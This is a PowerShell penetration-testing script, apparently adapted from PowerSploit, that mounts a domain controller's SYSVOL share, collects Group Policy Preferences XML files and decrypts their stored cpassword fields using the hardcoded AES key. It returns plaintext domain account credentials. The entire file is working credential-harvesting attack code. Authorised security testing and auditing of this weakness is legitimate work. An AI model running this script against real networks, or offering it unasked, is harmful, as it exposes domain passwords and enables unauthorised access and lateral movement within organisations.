<#

SCRIPT
Get-DomainPasswordsGPP.ps1

AUTHOR
Chris Campbell (@obscuresec)

MOD AUTHOR
Scott Sutherland (@_nullbind), NetSPI 2015

DESCRIPTION
This script will recover plaintext passwords and other information for accounts pushed 
through Group Policy Preferences. The summary of changes made to Chris's original script include:
- Added support for the use of alternative credentials so users can connect to domain controllers 
  that their computer is not associated with.
- Replaced recursive directory search with list of default file locations to speed up file search.

USAGE EXAMPLES
Get-DomainPasswordsGPP 
Get-DomainPasswordsGPP -Verbose
Get-DomainPasswordsGPP -Verbose -DomainController IP -useranme domain\user -password 'passwordhere'

REFERENCES
Most of the code here is based on the Get-GPPPassword function written by Chris Campbell (@obscuresec).
https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1

#>

function Get-DomainPasswordsGPP
{
    [CmdletBinding(DefaultParametersetName="Default")]
    Param(

        [Parameter(Mandatory=$false,
        HelpMessage="Domain user to authenticate with domain\user.")]
        [string]$username,

        [Parameter(Mandatory=$false,
        HelpMessage="Domain password to authenticate with domain\user.")]
        [string]$password,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController
    )

    Begin
    {

        Write-Verbose "Getting domain group policy preference passwords..."

        # Create PS Credential object
        if($Password){
            $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential ($Username, $secpass)                
        }

        # Ensure that machine is domain joined and script is running as a domain account, or a credential has been provided
        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) -and (-not $Credential) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
            return
        }

        # ----------------------------------------------------------------
        # Define helper function that decodes and decrypts password
        # ----------------------------------------------------------------
        function Get-DecryptedCpassword {
            [CmdletBinding()]
            Param (
                [string] $Cpassword 
            )

            try {
                #Append appropriate padding based on string length  
                $Mod = ($Cpassword.length % 4)
            
                switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
                }

                $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
                #Create a new AES .NET Crypto Object
                $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                     0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
                #Set IV to all nulls to prevent dynamic generation of IV value
                $AesIV = New-Object Byte[]($AesObject.IV.Length) 
                $AesObject.IV = $AesIV
                $AesObject.Key = $AesKey
                $DecryptorObject = $AesObject.CreateDecryptor() 
                [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
                return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
            } 
        
            catch {Write-Error $Error[0]}
        }  
       
        # ----------------------------------------------------------------
        # Authenticate to DC and mount sysvol share
        # ----------------------------------------------------------------
 
        # Set target DC
        if($DomainController){
            $TargetDC = "\\$DomainController"
        }else{
            $TargetDC = $env:LOGONSERVER
        }

        # Create randomish name for dynamic mount point 
        $set = "abcdefghijklmnopqrstuvwxyz".ToCharArray();
        $result += $set | Get-Random -Count 10
        $DriveName = [String]::Join("",$result)        
        $DrivePath = "$TargetDC\sysvol"

        # Map a temp drive to the DC sysvol share
        Write-Verbose "Creating temp drive $DriveName mapped to $DrivePath..."
        If ($Credential.UserName){
        
            # Mount the drive
            New-PSDrive -PSProvider FileSystem -Name $DriveName -Root $DrivePath -Credential $Credential| Out-Null                        
        }else{
            
            # Create a temp drive mapping
            New-PSDrive -PSProvider FileSystem -Name $DriveName -Root $DrivePath | Out-Null                   
        }        
    }

    Process
    {
        # Verify temp drive mounted
        $DriveCheck = Get-PSDrive | Where { $_.name -like "$DriveName"}
        if($DriveCheck) {
            #Write-Verbose "$Drivename created."
        }else{
            Write-Verbose "Failed to mount $DriveName to $DrivePath."
            return
        }

        # ----------------------------------------------------------------
        # Find, download, parse, decrypt, and display results
        # ----------------------------------------------------------------
        
        # Setup temp drive name
        $DriveLetter = $DriveName+":"

        # Create table to store gpp passwords 
        $TableGPPPasswords = New-Object System.Data.DataTable         
        $TableGPPPasswords.Columns.Add('NewName') | Out-Null
        $TableGPPPasswords.Columns.Add('Changed') | Out-Null
        $TableGPPPasswords.Columns.Add('UserName') | Out-Null        
        $TableGPPPasswords.Columns.Add('CPassword') | Out-Null
        $TableGPPPasswords.Columns.Add('Password') | Out-Null        
        $TableGPPPasswords.Columns.Add('File') | Out-Null 

        # Create table to store default group policy configuration file paths
        $TableDefaultGPFilePaths = New-Object system.data.datatable
        $TableDefaultGPFilePaths.Columns.Add('filename') | Out-Null
        $TableDefaultGPFilePaths.Columns.Add('filepath') | Out-Null  

        # Add default group policy configuration file paths to table
        $TableDefaultGPFilePaths.Rows.Add("Groups.xml","\Machine\Preferences\Groups\Groups.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Groups.xml","\User\Preferences\Groups\Groups.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Services.xml","\Machine\Preferences\Services\Services.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Services.xml","\User\Preferences\Services\Services.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Scheduledtasks.xml","\Machine\Preferences\Scheduledtasks\Scheduledtasks.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Scheduledtasks.xml","\User\Preferences\Scheduledtasks\Scheduledtasks.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("DataSources.xml","\Machine\Preferences\DataSources\DataSources.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("DataSources.xml","\User\Preferences\DataSources\DataSources.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Printers.xml","\Machine\Preferences\Printers\Printers.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Printers.xml","\User\Preferences\Printers\Printers.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Drives.xml","\Machine\Preferences\Drives\Drives.xml") | Out-Null
        $TableDefaultGPFilePaths.Rows.Add("Drives.xml","\User\Preferences\Drives\Drives.xml") | Out-Null 
        
        # Create table to store verified files
        $TableGPFilePaths = New-Object system.data.datatable
        $TableGPFilePaths.Columns.Add('filename') | Out-Null
        $TableGPFilePaths.Columns.Add('filepath') | Out-Null
        $TableGPFilePaths.Clear()       

        # Determine policies folder path
        $GpoDomain = Get-ChildItem $DrivePath | Select-Object name -First 1 -ExpandProperty name
        $GpoPoliciesPath = "$DrivePath\$GpoDomain\Policies"

        # Iterate through each policy folder
        Get-ChildItem $GpoPoliciesPath | Select-Object fullname -ExpandProperty fullname |
        ForEach-Object {

            $GpPolicyPath = $_                   
            
            # Iterate through each potential gpp file path
            $TableDefaultGPFilePaths |
            ForEach-Object{

                # Create full path to gp configuraiton file
		$GpFile = $_.filename
		$GpPath = $_.filepath
		$GpFullPath = "$GpPolicyPath$GpPath"
                
                # Check if file exists
                if(Test-Path $GpFullPath -ErrorAction SilentlyContinue)
                {
                    # Add files that exist to table
                    $TableGPFilePaths.Rows.Add($GpFile,$GpFullPath) | Out-Null                    
                }
            }            
        }

        # Check if files were found
        $TableGPFilePathCount = $TableGPFilePaths.Rows.Count
        if ($TableGPFilePathCount -eq 0) {
            throw '0 group policy preference files were found.'
            return
        }else{
            Write-Verbose "$TableGPFilePathCount group policy preference files were found."
        }       

        # Iterate through each verified group policy file        
        $TableGPFilePaths | 
        ForEach-Object {
            [string]$FileName = $_.filename
            [string]$FilePath = $_.filepath

            # Get file content
            [xml]$FileContent = Get-Content -Path "$FilePath"

            # Parse Drives.xml
            if($FileName -like "Drives.xml"){   

                Write-Verbose "Parsing $FileName..."
                 
                $FileContent.Drives.Drive | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            }  
            
            # Parse Groups.xml
            if($FileName -eq "Groups.xml"){   

                Write-Verbose "Parsing $FileName..."
                 
                $FileContent.Groups.User | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = $_.properties.newname        
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            } 
            
            # Parse Services.xml
            if($FileName -eq "Services.xml"){   

                Write-Verbose "Parsing $FileName..."
                 
                $FileContent.NTServices.NTService | 
                ForEach-Object {
                    [string]$Username = $_.properties.accountname
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            }
            
            # Parse ScheduledTasks.xml
            if($FileName -eq "ScheduledTasks.xml"){   

                Write-Verbose "Parsing $FileName..."
                 
                $FileContent.ScheduledTasks.Task | 
                ForEach-Object {
                    [string]$Username = $_.properties.runas
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            } 
            
            # Parse DataSources.xml
            if($FileName -eq "DataSources.xml"){   

                Write-Verbose "Parsing $FileName..."
                 
                $FileContent.DataSources.DataSource | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [datetime]$Changed = $_.changed
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            }
            
            # Parse Printers.xml
            if($FileName -eq "Printers.xml"){   

                Write-Verbose "Parsing $FileName..."
                 
                $FileContent.Printers.SharedPrinter | 
                ForEach-Object {
                    [string]$Username = $_.properties.username
                    [string]$CPassword = $_.properties.cpassword
                    [string]$Password = Get-DecryptedCpassword $Cpassword
                    [string]$Changed = [datetime]::FromFileTimeUTC([string]$_.changed)
                    [string]$NewName = ""         
                    
                    # Add the results to the data table
                    $TableGPPPasswords.Rows.Add($NewName,$Changed,$Username,$Cpassword,$Password,$FilePath) | Out-Null      
                }                
            }
            
        }        
              
        # Remove the temp drive mapping
        Write-Verbose "Removing temp drive $DriveName..."
        Remove-PSDrive $DriveName
        
        # Display results
        $PasswordCount = $TableGPPPasswords | Sort-Object username -Unique | Select-Object username | Where-Object {$_.username -ne ""} | Measure-Object | Select-Object Count -ExpandProperty Count
        if($PasswordCount -ne 0)
        {
            Write-Verbose "$PasswordCount domain group policy preference passwords were found."
            Return $TableGPPPasswords
        }else{
            Write-Verbose "0 domain group policy preference passwords were found."
        }
    }

    END
    {
    }
}

